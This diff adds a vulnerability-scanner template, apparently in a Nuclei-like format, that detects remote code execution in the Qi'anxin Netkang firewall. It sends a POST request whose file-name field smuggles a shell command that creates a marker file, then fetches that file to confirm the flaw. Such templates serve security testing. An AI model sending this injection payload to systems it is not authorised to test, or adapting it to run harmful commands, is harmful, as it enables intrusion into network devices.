@@ -1,0 +1,28 @@
+id: qi-anxin-netkang-next-generation-firewall-rce
+brief:
+    title: Qi'anxin Netkang Next Generation Firewall - Remote Code Execution
+    by: pikpikcu
+    level: critical
+    about: Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.
+    label:
+        - rce
+        - firewall
+        - intrusive
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/directdata/direct/router'
+      body: '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'
+      signs:
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{randstr}}.txt'
+      signs:
+        - "on": status
+          status:
+            - 200
